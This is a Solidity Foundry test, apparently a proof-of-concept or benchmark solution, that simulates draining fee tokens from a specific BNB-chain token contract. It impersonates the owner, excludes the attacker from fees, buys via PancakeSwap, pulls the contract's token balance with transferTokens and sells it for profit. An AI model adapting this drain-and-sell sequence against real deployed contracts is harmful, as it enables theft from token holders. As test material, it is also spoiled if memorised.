pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interface for xenoX with functions we need
interface IxenoX {
    function owner() external view returns (address);
    function transferTokens(address recepient, uint256 amount) external;
    function excludeFromFee(address account) external;
    function setBuyTaxFeePercent(uint256 taxFee) external;
    function setBuyLiquidityFeePercent(uint256 liquidityFee) external;
    function setBuydevFeePercent(uint256 devFee) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function pancakeRouter() external view returns (address);
    function pancakePair() external view returns (address);
}

interface IPancakeRouter02 {
    function WETH() external view returns (address);
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xcb9fD3784e9F369C4AD3BD4CB0d3a21aCbF23a51;
    IxenoX token;
    address attacker;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        token = IxenoX(TARGET);

        // Get owner address
        address owner = token.owner();

        // Label addresses for clarity
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "xenoX Token");

        // Give attacker some ETH to start
        attacker = address(this);
        deal(attacker, 100 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;

        // Step 1: Get owner address
        address owner = token.owner();

        // Step 2: Impersonate owner
        vm.startPrank(owner);

        // Step 3: Exclude attacker from fees to avoid paying fees when we buy
        // (Optional but makes exploit more efficient)
        token.excludeFromFee(attacker);

        // Step 4: Set fees to high values to accumulate more in contract quickly
        // This step might not be necessary if fees are already set
        // token.setBuyTaxFeePercent(10);
        // token.setBuyLiquidityFeePercent(10);
        // token.setBuydevFeePercent(10);

        vm.stopPrank();

        // Step 5: Buy tokens to generate fees
        // Need to interact with PancakeSwap pair
        IPancakeRouter02 router = IPancakeRouter02(token.pancakeRouter());
        address weth = router.WETH();

        // Approve router to spend ETH
        uint256 buyAmount = 10 ether;

        // Swap ETH for tokens via router
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = TARGET;

        vm.prank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: buyAmount}(
            0,
            path,
            attacker,
            block.timestamp
        );

        // Step 6: Now contract should have accumulated fee tokens
        // Impersonate owner again to drain them
        vm.startPrank(owner);

        // Get contract token balance
        uint256 contractBalance = token.balanceOf(TARGET);

        // Drain all tokens to attacker
        if (contractBalance > 0) {
            token.transferTokens(attacker, contractBalance);
        }

        vm.stopPrank();

        // Step 7: Sell drained tokens for ETH
        uint256 attackerTokenBalance = token.balanceOf(attacker);
        if (attackerTokenBalance > 0) {
            // Approve router to spend tokens
            token.approve(address(router), attackerTokenBalance);

            // Swap tokens for ETH
            address[] memory sellPath = new address[](2);
            sellPath[0] = TARGET;
            sellPath[1] = weth;

            router.swapExactTokensForETHSupportingFeeOnTransferTokens(
                attackerTokenBalance,
                0,
                sellPath,
                attacker,
                block.timestamp
            );
        }

        // Profit is the ETH balance increase (checked by oracle)
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

